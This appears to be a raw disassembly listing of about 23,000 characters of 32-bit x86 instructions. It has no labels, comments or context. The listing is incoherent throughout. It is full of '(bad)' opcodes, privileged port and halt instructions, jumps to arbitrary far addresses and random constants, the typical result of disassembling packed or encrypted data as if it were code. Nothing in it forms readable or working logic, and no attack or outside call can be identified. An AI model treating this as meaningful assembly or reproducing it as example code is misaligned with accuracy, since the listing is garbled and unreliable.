  4056e8:	add    ecx,0x3d
  4056eb:	stos   BYTE PTR es:[edi],al
  4056ec:	pop    ecx
  4056ed:	push   edx
  4056ee:	add    DWORD PTR cs:[ecx-0x77005cf5],esi
  4056f5:	sub    eax,0xa769454
  4056fa:	sbb    al,0x44
  4056fc:	cmp    BYTE PTR [edi+0x0],ah
  4056ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405700:	and    DWORD PTR ds:0x3e718197,ebx
  405706:	neg    ah
  405708:	jo     0x405783
  40570a:	and    DWORD PTR [eax+0x27e7ddb0],ecx
  405710:	mov    ds:0x76abeeaa,al
  405715:	das    
  405716:	and    edi,esp
  405718:	mov    ah,BYTE PTR [ebx]
  40571a:	std    
  40571b:	sahf   
  40571c:	and    eax,esi
  40571e:	lods   eax,DWORD PTR ds:[esi]
  40571f:	cdq    
  405720:	sbb    DWORD PTR [esi+0x2d],edi
  405723:	pop    ds
  405724:	cmp    eax,0xd1c8a6e1
  405729:	in     eax,0x6a
  40572b:	inc    edi
  40572c:	dec    ebx
  40572d:	int3   
  40572e:	imul   edx,DWORD PTR [eax-0x2f6c5b3],0xbbe2fe26
  405738:	fnstsw WORD PTR [edx-0x51]
  40573b:	mov    ch,0x9e
  40573d:	pavgw  mm0,QWORD PTR [edx]
  405740:	and    esp,DWORD PTR [edi+0x7]
  405743:	cmp    BYTE PTR [esi],ah
  405745:	test   eax,0xd36dcfa3
  40574a:	pop    ebx
  40574b:	dec    esi
  40574c:	stc    
  40574d:	(bad)  
  40574e:	pop    edi
  40574f:	test   BYTE PTR [edi-0x5a322db6],0xaa
  405756:	xor    DWORD PTR [ecx-0x6d],edi
  405759:	xor    DWORD PTR [ecx],ecx
  40575b:	les    ebx,FWORD PTR [esi-0x67]
  40575e:	out    0x7f,al
  405760:	mov    dl,cl
  405762:	mov    dl,0x8e
  405764:	aad    0xd8
  405766:	pop    ecx
  405767:	mov    esi,0x763a44ee
  40576c:	aas    
  40576d:	lods   al,BYTE PTR ds:[esi]
  40576e:	push   ebx
  40576f:	cwde   
  405770:	pop    esp
  405771:	leave  
  405772:	mov    ebx,0xabe0ad3a
  405777:	pop    esi
  405778:	retf   0xbb0e
  40577b:	and    DWORD PTR [ebx],edx
  40577d:	sub    bh,BYTE PTR [eax+0x5316e664]
  405783:	dec    edx
  405784:	lea    ebx,[ebx+0x1a1605d3]
  40578a:	inc    edi
  40578b:	out    dx,eax
  40578c:	jns    0x4057d3
  40578e:	pop    ebp
  40578f:	neg    BYTE PTR [ebx]
  405791:	and    bh,BYTE PTR [eax]
  405793:	cmp    ch,BYTE PTR [ebp+0x39339d9b]
  405799:	add    al,0xb7
  40579b:	add    ah,bh
  40579d:	(bad)  
  40579e:	fstp   TBYTE PTR [esp+eax*1+0x4739a069]
  4057a5:	xchg   edx,eax
  4057a6:	mov    DWORD PTR [edx+0x5cdecc3],eax
  4057ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057ad:	cmp    ebx,DWORD PTR [edx+0x1f527655]
  4057b3:	mov    ah,0xc0
  4057b5:	mov    eax,ds:0xfa1dc544
  4057ba:	xchg   edi,eax
  4057bb:	pop    ss
  4057bc:	test   BYTE PTR [edx+esi*1],dh
  4057bf:	pop    esi
  4057c0:	cdq    
  4057c1:	js     0x405822
  4057c3:	aas    
  4057c4:	clc    
  4057c5:	imul   ecx,DWORD PTR [eax+0x26],0x4e
  4057c9:	in     eax,0xb0
  4057cb:	adc    BYTE PTR [ebp+0x327a9095],dh
  4057d1:	sbb    eax,DWORD PTR [ecx+edx*8+0x5c9951df]
  4057d8:	fs pop ecx
  4057da:	jge    0x405829
  4057dc:	jmp    0x3d23e626
  4057e1:	mov    al,BYTE PTR [esi]
  4057e3:	cdq    
  4057e4:	xor    BYTE PTR [edi-0x58e8579c],ch
  4057ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057eb:	loope  0x40579c
  4057ed:	xchg   esp,eax
  4057ee:	pop    esi
  4057ef:	jle    0x40585d
  4057f1:	das    
  4057f2:	loope  0x4057d4
  4057f4:	pop    ds
  4057f5:	lods   al,BYTE PTR ds:[esi]
  4057f6:	cmovne ecx,esp
  4057f9:	adc    eax,0x4fa75d35
  4057fe:	retf   
  4057ff:	scas   eax,DWORD PTR es:[edi]
  405800:	imul   esi,DWORD PTR [edi],0x76
  405803:	cmp    esi,DWORD PTR [ebx-0x65]
  405806:	push   esp
  405807:	cmp    DWORD PTR [edx],ecx
  405809:	sub    esi,ebp
  40580b:	push   ebp
  40580c:	xor    eax,0x61033cc8
  405811:	adc    DWORD PTR [edi],0x4f82ddee
  405817:	adc    ah,ah
  405819:	jle    0x405813
  40581b:	nop
  40581c:	push   ss
  40581d:	stc    
  40581e:	xchg   esi,eax
  40581f:	dec    eax
  405820:	dec    ebx
  405821:	mov    bh,0x6
  405823:	dec    ebx
  405824:	adc    DWORD PTR [ecx],0x44
  405827:	sbb    BYTE PTR [ecx+0x43],ah
  40582a:	stc    
  40582b:	into   
  40582c:	push   esi
  40582d:	xor    al,dl
  40582f:	mov    al,ds:0x172f6637
  405834:	inc    esp
  405835:	xchg   ebx,eax
  405836:	sahf   
  405837:	adc    eax,0xd6d7f23e
  40583c:	dec    esp
  40583d:	aam    0x50
  40583f:	xchg   edi,eax
  405840:	(bad)  
  405841:	aaa    
  405842:	mov    ch,0xec
  405844:	fdiv   QWORD PTR [ebx-0x24]
  405847:	sub    esp,esi
  405849:	add    BYTE PTR [edx],dl
  40584b:	xchg   edi,eax
  40584c:	xchg   ebp,eax
  40584d:	out    dx,eax
  40584e:	call   0xac2a6828
  405853:	sar    cl,0xb8
  405856:	fwait
  405857:	imul   ecx,DWORD PTR [ebp+edi*4-0x56],0x25bf20dc
  40585f:	loop   0x405871
  405861:	mov    dh,0xbc
  405863:	add    al,0xe7
  405865:	in     al,dx
  405866:	xchg   ebx,eax
  405867:	adc    eax,0x1d6fafe6
  40586c:	xor    al,0x1a
  40586e:	sbb    ecx,DWORD PTR [edi-0x3e]
  405871:	pop    edx
  405872:	inc    ebp
  405873:	pushf  
  405874:	inc    ebp
  405875:	(bad)  
  405877:	fs jecxz 0x40580c
  40587a:	inc    esi
  40587b:	sub    esp,0x57
  40587e:	mov    edi,0x66cd1ca4
  405883:	sti    
  405884:	sbb    DWORD PTR [eax-0x3d],edx
  405887:	jo     0x4058b8
  405889:	mov    bh,0xa0
  40588b:	adc    bl,BYTE PTR [edi]
  40588d:	pop    ecx
  40588e:	rol    BYTE PTR [ebx+eiz*8+0x25],0x1d
  405893:	fadd   st(5),st
  405895:	out    0xc1,eax
  405897:	cmp    al,BYTE PTR [ecx-0x7b]
  40589a:	fwait
  40589b:	xchg   esp,eax
  40589c:	pop    ebp
  40589d:	lock out 0x3a,al
  4058a0:	pop    ebp
  4058a1:	ja     0x405897
  4058a3:	mov    eax,0xfd384c50
  4058a8:	mov    esi,0x59f03e74
  4058ad:	(bad)  
  4058ae:	sbb    DWORD PTR [eax-0xd],edx
  4058b1:	(bad)  
  4058b2:	lods   al,BYTE PTR ds:[esi]
  4058b3:	ds dec eax
  4058b5:	pop    ss
  4058b6:	xchg   esi,eax
  4058b7:	mov    dh,0xf9
  4058b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058ba:	cmp    al,0xfe
  4058bc:	sub    eax,0x6210b448
  4058c1:	dec    ebx
  4058c2:	push   eax
  4058c3:	and    DWORD PTR [esp+edx*8-0x4d],0x804b2fce
  4058cb:	sbb    dl,al
  4058cd:	sub    BYTE PTR [esi+ebp*8-0x1543ff0d],dh
  4058d4:	jbe    0x405922
  4058d6:	pop    ebp
  4058d7:	push   eax
  4058d8:	jle    0x4058fb
  4058da:	shl    BYTE PTR [edx-0x48],0x37
  4058de:	inc    edx
  4058df:	adc    dl,BYTE PTR [ebx]
  4058e1:	(bad)  
  4058e2:	mov    WORD PTR [edx-0x20],cs
  4058e5:	cmp    eax,0x7319f40d
  4058ea:	cld    
  4058eb:	push   edx
  4058ec:	out    0x52,al
  4058ee:	inc    eax
  4058ef:	jp     0x405914
  4058f1:	mov    edx,0x172622b5
  4058f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058f7:	lods   al,BYTE PTR ds:[esi]
  4058f8:	cmc    
  4058f9:	and    BYTE PTR [eax+0x74cc99fd],0x3b
  405900:	pop    esp
  405901:	jmp    0x40595c
  405903:	shl    DWORD PTR [edi],0xdc
  405906:	sbb    eax,0x1faecdc
  40590b:	sti    
  40590c:	cmp    BYTE PTR [edi-0xe],al
  40590f:	not    BYTE PTR [edx-0x7a]
  405912:	(bad)  
  405913:	in     al,0x5f
  405915:	mov    DWORD PTR [eax+0xfd560e1],esi
  40591b:	imul   ebx,DWORD PTR [ecx-0x1d17e62c],0x42
  405922:	cwde   
  405923:	ret    0x893f
  405926:	out    0x5d,eax
  405928:	dec    ecx
  405929:	(bad)  
  40592a:	pop    eax
  40592b:	dec    edx
  40592c:	jno    0x4059a8
  40592e:	jb     0x4058b7
  405930:	add    eax,DWORD PTR [eax]
  405932:	repnz xor BYTE PTR [ebp-0x6b],cl
  405936:	push   ds
  405937:	add    edx,edx
  405939:	inc    edx
  40593a:	lahf   
  40593b:	cmp    eax,0x452fee30
  405940:	sub    al,0xf3
  405942:	(bad)  
  405943:	jg     0x4058f0
  405945:	adc    eax,0x75717d70
  40594a:	inc    DWORD PTR ds:0x6a9ddfb4
  405950:	push   ebp
  405951:	into   
  405952:	jl     0x40591f
  405954:	fimul  DWORD PTR [ecx+0x3]
  405957:	pop    esi
  405958:	int    0x9
  40595a:	aaa    
  40595b:	mov    edi,0x22821dee
  405960:	mov    al,ds:0x65b157fa
  405965:	push   esp
  405966:	sbb    al,0xfc
  405968:	fidiv  WORD PTR [ecx-0x51]
  40596b:	(bad)  
  40596c:	out    dx,al
  40596d:	push   ebx
  40596e:	gs icebp 
  405970:	xchg   edx,eax
  405971:	cwde   
  405972:	std    
  405973:	jae    0x40591e
  405975:	ds nop
  405977:	jp     0x405919
  405979:	addr16 sbb al,0xbe
  40597c:	adc    ebx,edx
  40597e:	ins    BYTE PTR es:[edi],dx
  40597f:	ins    DWORD PTR es:[edi],dx
  405980:	sbb    esp,DWORD PTR [eax+ecx*8+0x60]
  405984:	hlt    
  405985:	sub    eax,0x2a036e81
  40598a:	sar    DWORD PTR [esi],0x9
  40598d:	dec    esi
  40598e:	dec    DWORD PTR [ebp+0x37]
  405991:	push   esi
  405992:	pop    edi
  405993:	shr    cl,1
  405995:	mov    eax,ds:0xf29eaf9e
  40599a:	sub    al,BYTE PTR [eax]
  40599c:	cwde   
  40599d:	repz jmp 0xf3fe:0x1aad4461
  4059a5:	and    al,0xb5
  4059a7:	sbb    eax,0x3fc081ca
  4059ac:	out    dx,al
  4059ad:	lock out dx,eax
  4059af:	shrd   DWORD PTR [ecx+0x4fe55160],esi,0xb4
  4059b7:	rcr    BYTE PTR [ebp+0x754bc954],1
  4059bd:	xchg   edx,eax
  4059be:	adc    bh,BYTE PTR [eax]
  4059c0:	icebp  
  4059c1:	or     ebx,DWORD PTR [ebx]
  4059c3:	int    0xe5
  4059c5:	js     0x405998
  4059c7:	push   ebx
  4059c8:	scas   al,BYTE PTR es:[edi]
  4059c9:	push   0x5c585f89
  4059ce:	ins    DWORD PTR es:[edi],dx
  4059cf:	bound  edx,QWORD PTR [esi+0x4974d96f]
  4059d5:	inc    DWORD PTR [esi+edi*2+0x31adead0]
  4059dc:	adc    BYTE PTR [edi+0x294f48bb],al
  4059e2:	xor    dl,BYTE PTR [ebx+0x3c]
  4059e5:	in     eax,dx
  4059e6:	stos   DWORD PTR es:[edi],eax
  4059e7:	arpl   WORD PTR [esi],ax
  4059e9:	cmp    al,0xad
  4059eb:	scas   eax,DWORD PTR es:[edi]
  4059ec:	cli    
  4059ed:	add    eax,0x8a978c61
  4059f2:	xchg   ebp,eax
  4059f3:	sahf   
  4059f4:	dec    ebx
  4059f5:	push   ecx
  4059f6:	leave  
  4059f7:	hlt    
  4059f8:	sbb    al,BYTE PTR [ebp-0x6a]
  4059fb:	(bad)  
  4059fc:	cmp    eax,0x129fc3e3
  405a01:	jmp    0xa96bcd8d
  405a06:	adc    al,0x64
  405a08:	inc    esp
  405a09:	in     eax,dx
  405a0a:	add    ebp,eax
  405a0c:	mov    esp,0x561314cf
  405a11:	(bad)  
  405a12:	ins    DWORD PTR es:[edi],dx
  405a13:	pop    eax
  405a14:	or     DWORD PTR [ecx+0x3],eax
  405a17:	cmp    dh,dl
  405a19:	xlat   BYTE PTR ds:[ebx]
  405a1a:	xor    BYTE PTR [ecx+0x5cc5c2a7],ch
  405a20:	lods   eax,DWORD PTR ds:[esi]
  405a21:	or     ch,BYTE PTR [ebx+0x20c3cce6]
  405a27:	mov    dh,0x9f
  405a29:	mov    esi,0x66e11646
  405a2e:	sub    ebp,eax
  405a30:	lahf   
  405a31:	sbb    eax,0x5bb46ed5
  405a36:	jp     0x4059e4
  405a38:	adc    al,0xe4
  405a3a:	dec    eax
  405a3b:	xchg   ebp,eax
  405a3c:	jno    0x405a9a
  405a3e:	sti    
  405a3f:	ins    DWORD PTR es:[edi],dx
  405a40:	daa    
  405a41:	pop    ss
  405a42:	pop    ss
  405a43:	cwde   
  405a44:	push   esi
  405a45:	mov    dh,0x54
  405a47:	xchg   esi,eax
  405a48:	dec    eax
  405a49:	mul    DWORD PTR ds:0x6cb59514
  405a4f:	xchg   ecx,eax
  405a50:	test   DWORD PTR [edi+eiz*1],edx
  405a53:	pop    edi
  405a54:	jp     0x405aa7
  405a56:	ret    
  405a57:	aaa    
  405a58:	inc    eax
  405a59:	icebp  
  405a5a:	and    bl,BYTE PTR [ebp-0x6e]
  405a5d:	loop   0x405a18
  405a5f:	mov    edx,0x36e33a82
  405a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a65:	and    BYTE PTR [ebp+0x22],bh
  405a68:	pop    eax
  405a69:	fidivr WORD PTR [ecx+ecx*1+0x44]
  405a6d:	cmp    al,0x8a
  405a6f:	sub    bh,BYTE PTR [esi-0x4801d8b6]
  405a75:	je     0x405ad3
  405a77:	push   0xe28924e8
  405a7c:	ins    DWORD PTR es:[edi],dx
  405a7d:	in     al,0x2b
  405a7f:	add    eax,0x7ac5589f
  405a84:	jl     0x405a27
  405a86:	xabort 0x45
  405a89:	xchg   BYTE PTR [esi-0x3d3510ee],cl
  405a8f:	aam    0xd4
  405a91:	sbb    esi,edx
  405a93:	add    al,0xd8
  405a95:	sbb    al,bh
  405a97:	mov    ch,0xb2
  405a99:	sub    BYTE PTR [ebx-0xc408f17],bl
  405a9f:	adc    eax,0x5aef0f6b
  405aa4:	push   eax
  405aa5:	jb     0x405a4b
  405aa7:	lock xor eax,0x9b78a242
  405aad:	sbb    ah,BYTE PTR [ecx]
  405aaf:	shl    al,0x61
  405ab2:	aaa    
  405ab3:	ret    0x3047
  405ab6:	pop    ds
  405ab7:	mov    ch,0xd0
  405ab9:	jno    0x405a6f
  405abb:	sub    BYTE PTR [edi],dl
  405abd:	arpl   WORD PTR fs:[ebp-0x57],bx
  405ac1:	loopne 0x405aa5
  405ac3:	cwde   
  405ac4:	inc    esi
  405ac5:	loope  0x405ae5
  405ac7:	add    dh,BYTE PTR [ebp+0x38]
  405aca:	das    
  405acb:	in     al,0x47
  405acd:	mov    eax,0x4277bf2e
  405ad2:	jae    0x405b2e
  405ad4:	ret    
  405ad5:	xchg   edi,eax
  405ad6:	sbb    BYTE PTR [edx-0x7ea9f5ea],ah
  405adc:	cli    
  405add:	mov    cl,0x1
  405adf:	retf   
  405ae0:	sub    esp,ebx
  405ae2:	sbb    BYTE PTR ds:[edx+0x6e],0xef
  405ae7:	fisub  DWORD PTR [eax+ebx*1-0xc]
  405aeb:	xchg   ebp,eax
  405aec:	imul   esi,ebp,0x3fbf1e06
  405af2:	jo     0x405aa2
  405af4:	jmp    DWORD PTR [ebx-0x1e]
  405af7:	test   al,0x7
  405af9:	push   esp
  405afa:	sbb    sp,bx
  405afd:	mov    al,0xe0
  405b00:	add    DWORD PTR [edi-0x33],0xffffffca
  405b04:	and    BYTE PTR [eax],0x92
  405b07:	inc    esi
  405b08:	sahf   
  405b09:	mov    ebp,ebx
  405b0b:	mov    edx,0xae676d5c
  405b10:	pop    ecx
  405b11:	dec    ebp
  405b12:	popa   
  405b13:	jg     0x405aea
  405b15:	add    eax,0xae12f85d
  405b1a:	cld    
  405b1b:	sub    DWORD PTR [eax+0x0],0xec3cb110
  405b22:	push   ds
  405b23:	lahf   
  405b24:	clc    
  405b25:	xor    ah,BYTE PTR [esi+0x74171c8d]
  405b2b:	xchg   ebp,eax
  405b2c:	rep stos DWORD PTR es:[edi],eax
  405b2e:	sbb    ah,BYTE PTR [edi+0x5f]
  405b31:	std    
  405b32:	fld    DWORD PTR [eax]
  405b34:	jb     0x405b3b
  405b36:	mov    DWORD PTR [esi+0x1e227f0e],esi
  405b3c:	cmp    DWORD PTR [eax],0xffffff8f
  405b3f:	dec    esp
  405b40:	aas    
  405b41:	push   ds
  405b42:	mov    ds:0x912a45ee,eax
  405b47:	inc    ebp
  405b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b49:	mov    bh,0x61
  405b4b:	sub    esi,ebp
  405b4d:	or     esi,DWORD PTR [ebp+0x33]
  405b50:	mov    ds:0x8ccbc81d,al
  405b55:	lods   al,BYTE PTR ds:[esi]
  405b56:	in     al,0x60
  405b58:	inc    ebp
  405b59:	(bad)  
  405b5a:	mov    ecx,0x5de54d21
  405b5f:	mov    WORD PTR [eax*4-0x51032f1d],ss
  405b66:	(bad)  
  405b68:	mov    ebx,0x6fd9e3a1
  405b6d:	pushf  
  405b6e:	shl    BYTE PTR [ecx+0x14],cl
  405b71:	fild   QWORD PTR [esi+0x74]
  405b74:	pop    ds
  405b75:	mov    dh,0x79
  405b77:	pop    ebx
  405b78:	add    dh,0x2d
  405b7b:	cmp    al,0xab
  405b7d:	jne    0x405b13
  405b7f:	mov    al,0x26
  405b81:	not    BYTE PTR [eax-0x73]
  405b84:	add    edx,ebp
  405b86:	fcomp  st(5)
  405b88:	icebp  
  405b89:	pusha  
  405b8a:	jle    0x405bf9
  405b8c:	out    0xdd,eax
  405b8e:	mov    BYTE PTR [esi-0x7f1a8b90],cl
  405b94:	aam    0xe3
  405b96:	jb     0x405b45
  405b98:	and    al,BYTE PTR [esi]
  405b9a:	je     0x405b43
  405b9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b9d:	xor    bl,BYTE PTR [edx]
  405b9f:	inc    BYTE PTR [ebx+0x155b16f8]
  405ba5:	and    al,0xfb
  405ba7:	js     0x405b75
  405ba9:	(bad)  
  405baa:	xchg   edx,eax
  405bab:	or     eax,DWORD PTR [edx]
  405bad:	aaa    
  405bae:	inc    esp
  405baf:	aad    0x21
  405bb1:	dec    esi
  405bb2:	add    esp,DWORD PTR [edi-0x3c]
  405bb5:	dec    esi
  405bb6:	bound  eax,QWORD PTR [ebx+0x4a]
  405bb9:	arpl   WORD PTR [esi-0x6d942405],si
  405bbf:	fimul  DWORD PTR [ebx+esi*8-0x65da7e44]
  405bc6:	and    BYTE PTR [esi+0x74],bl
  405bc9:	dec    esi
  405bca:	imul   edx,DWORD PTR [eax+0x4695feda],0xfffffffe
  405bd1:	cmp    DWORD PTR [edx],edx
  405bd3:	cli    
  405bd4:	dec    esi
  405bd5:	aaa    
  405bd6:	retf   
  405bd7:	les    ecx,FWORD PTR [edx-0x343ec723]
  405bdd:	pop    esp
  405bde:	fiadd  WORD PTR [edi+0x3c]
  405be1:	ror    DWORD PTR [eax+0x472722ce],cl
  405be7:	dec    edx
  405be8:	addr16 push edx
  405bea:	std    
  405beb:	aad    0xd8
  405bed:	fld    TBYTE PTR [ebx-0x56]
  405bf0:	inc    edi
  405bf1:	xchg   esi,eax
  405bf2:	ins    DWORD PTR es:[edi],dx
  405bf3:	mov    ecx,0xfa35e3e9
  405bf8:	sahf   
  405bf9:	lahf   
  405bfa:	dec    edx
  405bfb:	sbb    ebx,DWORD PTR [ebp+0x7d896cfc]
  405c01:	jl     0x405c24
  405c03:	mov    ds:0xec4b5e04,eax
  405c08:	mov    esi,0xa252f11a
  405c0d:	jns    0x405b9e
  405c0f:	and    ebx,DWORD PTR fs:[edx-0x51]
  405c13:	cmp    cl,ah
  405c15:	dec    eax
  405c16:	xchg   edi,eax
  405c17:	stos   DWORD PTR es:[edi],eax
  405c18:	push   es
  405c19:	cmp    BYTE PTR [eax+0x1362bfe7],dl
  405c1f:	or     DWORD PTR [edx+0x7212550c],edx
  405c25:	adc    edx,DWORD PTR [ebx+0x18]
  405c28:	or     BYTE PTR [ecx-0xceb79e5],bh
  405c2e:	fs jno 0x405c84
  405c31:	aas    
  405c32:	iret   
  405c33:	inc    ecx
  405c34:	jae    0x405ca0
  405c36:	jae    0x405bce
  405c38:	sbb    al,0xfd
  405c3a:	dec    edi
  405c3b:	sub    al,0x9f
  405c3d:	in     eax,0xbc
  405c3f:	sbb    esp,edi
  405c41:	adc    ebp,DWORD PTR [ebp+0x22]
  405c44:	dec    edi
  405c45:	loope  0x405bf1
  405c47:	iret   
  405c48:	sub    DWORD PTR [ebp-0x515a1411],edx
  405c4e:	(bad)  
  405c4f:	mov    ds:0x8fcb22ef,eax
  405c54:	in     eax,dx
  405c55:	pop    eax
  405c56:	inc    edi
  405c57:	sub    bl,BYTE PTR [ebp-0x2555a51d]
  405c5d:	call   0x5a3:0x933147af
  405c64:	xchg   ebp,eax
  405c65:	pusha  
  405c66:	xchg   edi,eax
  405c67:	xor    ebx,ecx
  405c69:	lds    ecx,FWORD PTR [edx-0x35]
  405c6c:	out    0x46,eax
  405c6e:	push   esp
  405c6f:	mov    dl,0x98
  405c71:	sub    eax,0x739cee1b
  405c76:	aaa    
  405c77:	lock mov esi,0x6e90e369
  405c7d:	jge    0x405c74
  405c7f:	cmp    ecx,DWORD PTR [ebx-0x6ba732bc]
  405c85:	jns    0x405cd5
  405c87:	aaa    
  405c88:	jecxz  0x405cef
  405c8a:	or     eax,DWORD PTR ds:0x7d054a22
  405c90:	movq   QWORD PTR [ecx],mm6
  405c93:	daa    
  405c94:	dec    ecx
  405c95:	and    al,0x7d
  405c97:	or     BYTE PTR [ecx],bh
  405c99:	je     0x405ce5
  405c9b:	jbe    0x405c4b
  405c9d:	or     BYTE PTR [edi-0x7dbc3a7],ch
  405ca3:	sub    eax,0xc67f5097
  405ca8:	(bad)  
  405ca9:	jb     0x405cbb
  405cab:	aaa    
  405cac:	adc    BYTE PTR [esp+ecx*1],ch
  405caf:	dec    eax
  405cb0:	iret   
  405cb1:	in     eax,dx
  405cb2:	in     eax,0xd9
  405cb4:	das    
  405cb5:	shl    BYTE PTR [esi],1
  405cb7:	call   0x2d40:0x5d00520
  405cbe:	xor    eax,0x54fce604
  405cc3:	mov    WORD PTR [edx],es
  405cc5:	movups xmm6,xmm2
  405cc8:	lea    ecx,[ecx]
  405cca:	ret    0x6737
  405ccd:	push   ds
  405cce:	mov    dh,0x5e
  405cd0:	push   es
  405cd1:	fsubr  QWORD PTR [ecx]
  405cd3:	hlt    
  405cd4:	xchg   edi,eax
  405cd5:	jmp    0x6ca8234a
  405cda:	mov    edi,DWORD PTR [edx-0x21]
  405cdd:	jo     0x405d48
  405cdf:	mov    BYTE PTR ds:0xf3d09766,dl
  405ce5:	jmp    0xb5f98b90
  405cea:	pop    es
  405ceb:	arpl   WORD PTR [ebx+0x7e417e5c],cx
  405cf1:	jmp    0x405d52
  405cf3:	xchg   ebp,eax
  405cf4:	addr16 fcmovne st,st(6)
  405cf7:	aam    0x9
  405cf9:	pop    ecx
  405cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cfb:	std    
  405cfc:	inc    edi
  405cfd:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  405cff:	mov    esi,0x6b28634c
  405d04:	push   0x16
  405d06:	mov    esi,0x595bcd3
  405d0b:	pop    ds
  405d0c:	pop    ds
  405d0d:	xchg   ebx,eax
  405d0e:	loope  0x405c98
  405d10:	inc    ebx
  405d11:	sbb    eax,0x2c25728
  405d16:	test   DWORD PTR [edi-0x436cdd6a],edx
  405d1c:	popf   
  405d1d:	mov    ecx,0x996d066e
  405d22:	cdq    
  405d23:	or     ch,dl
  405d25:	jp     0x405d1b
  405d27:	aam    0xec
  405d29:	fcomp  QWORD PTR [eax-0x7e]
  405d2c:	xchg   ebx,eax
  405d2d:	xor    al,0x31
  405d2f:	pop    eax
  405d30:	jmp    0x405d04
  405d32:	pop    ds
  405d33:	mov    ds:0xbc013b10,al
  405d38:	jne    0x405d18
  405d3a:	ja     0x405d99
  405d3c:	fldcw  WORD PTR [esi-0xd]
  405d3f:	xchg   ebx,eax
  405d40:	mov    ebx,0xd3043e80
  405d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d46:	ret    0xb92
  405d49:	and    BYTE PTR [eax-0x1f696470],ch
  405d4f:	aam    0x94
  405d51:	dec    ebp
  405d52:	mov    ebx,0xab8383c3
  405d57:	dec    eax
  405d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d59:	imul   ebp,ecx,0x18
  405d5c:	hlt    
  405d5d:	and    esi,DWORD PTR [esi-0x31]
  405d60:	loope  0x405d61
  405d62:	leave  
  405d63:	push   ecx
  405d64:	xor    BYTE PTR [ecx+0x6dba195c],cl
  405d6a:	sub    eax,0xbc6586b3
  405d6f:	shl    DWORD PTR [ebx+edx*4-0x4b2a748e],cl
  405d76:	stos   DWORD PTR es:[edi],eax
  405d77:	adc    ebx,DWORD PTR [ecx]
  405d79:	outs   dx,DWORD PTR ds:[esi]
  405d7a:	inc    edi
  405d7b:	mov    ch,0x96
  405d7d:	sbb    bl,ah
  405d7f:	push   ds
  405d80:	stos   BYTE PTR es:[edi],al
  405d81:	pop    es
  405d82:	retf   
  405d83:	stos   BYTE PTR es:[edi],al
  405d84:	push   0xffffffa9
  405d86:	gs jecxz 0x405d91
  405d89:	mov    ch,0xef
  405d8b:	lods   al,BYTE PTR ds:[esi]
  405d8c:	or     esp,DWORD PTR [eax+0x4d]
  405d8f:	pop    es
  405d90:	stos   BYTE PTR es:[edi],al
  405d91:	inc    edx
  405d92:	ret    0xba71
  405d95:	not    DWORD PTR [edi-0x2]
  405d98:	inc    edi
  405d99:	dec    ebp
  405d9a:	lds    eax,FWORD PTR [ebp-0x5e454e58]
  405da0:	imul   DWORD PTR [ebx-0x65]
  405da3:	jp     0x405df0
  405da5:	sbb    dl,ch
  405da7:	test   eax,0xacede5ed
  405dac:	mov    BYTE PTR [bx-0x40cf],0xc
  405db2:	dec    esi
  405db3:	xchg   DWORD PTR [ebx+0x28],ecx
  405db6:	or     edx,edx
  405db8:	inc    edx
  405db9:	push   0xffffff9f
  405dbb:	jge    0x405dd6
  405dbd:	sub    al,0x4a
  405dbf:	neg    BYTE PTR [edx-0x25f33b32]
  405dc5:	xchg   esi,eax
  405dc6:	xor    eax,0xafc0ae3e
  405dcb:	or     edx,ebp
  405dcd:	sub    DWORD PTR [ecx+ecx*4-0x7c],esi
  405dd1:	push   ss
  405dd2:	ja     0x405dc1
  405dd4:	repz (bad) 
  405dd6:	data16 mov bh,0x57
  405dd9:	inc    edx
  405dda:	out    0x19,al
  405ddc:	push   ebx
  405ddd:	jb     0x405d7c
  405ddf:	enter  0x89bb,0x5e
  405de3:	inc    eax
  405de4:	icebp  
  405de5:	(bad)  
  405de6:	ror    DWORD PTR [ecx-0x36],cl
  405de9:	sub    DWORD PTR [eax+0x4c],0x59
  405ded:	js     0x405dd7
  405def:	fcom   st(7)
  405df1:	mov    ebx,0x93a84d2d
  405df6:	mov    DWORD PTR [ebx+0x47],esp
  405df9:	adc    eax,DWORD PTR [eax]
  405dfb:	push   ss
  405dfc:	call   0x8c39:0x8b9f6a19
  405e03:	pop    es
  405e04:	fidiv  WORD PTR [ecx]
  405e06:	adc    BYTE PTR [ecx+0x6d],dl
  405e09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e0a:	or     eax,0x187933be
  405e0f:	stos   DWORD PTR es:[edi],eax
  405e10:	mov    ebp,0x67f7eb34
  405e15:	popa   
  405e16:	in     al,dx
  405e17:	cld    
  405e18:	js     0x405e0f
  405e1a:	in     al,0xd5
  405e1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e1d:	push   cs
  405e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e1f:	loopne 0x405e32
  405e21:	inc    ebx
  405e22:	aam    0x9a
  405e24:	mov    ch,BYTE PTR [ebx+0x6a]
  405e27:	das    
  405e28:	loop   0x405dc1
  405e2a:	mov    ds:0x56d0f52e,al
  405e2f:	loopne 0x405e1f
  405e31:	aas    
  405e32:	int3   
  405e33:	sbb    al,0xb4
  405e35:	std    
  405e36:	push   0xc500eace
  405e3b:	cmc    
  405e3c:	rcl    BYTE PTR [esi],cl
  405e3e:	mov    BYTE PTR [eax+0xe6ffd69],bh
  405e44:	iret   
  405e45:	jae    0x405e5e
  405e47:	out    0xd8,al
  405e49:	xchg   esp,eax
  405e4a:	fnstsw WORD PTR [eax]
  405e4c:	adc    BYTE PTR [edi+eiz*2],ch
  405e4f:	mov    ebx,0xa7bd9c8e
  405e54:	mov    ebp,0xfd2223f1
  405e59:	push   edi
  405e5a:	mov    BYTE PTR [edx+0x4dd41109],dh
  405e60:	jae    0x405e69
  405e62:	lods   eax,DWORD PTR ds:[esi]
  405e63:	outs   dx,BYTE PTR ds:[esi]
  405e64:	sbb    al,0xa2
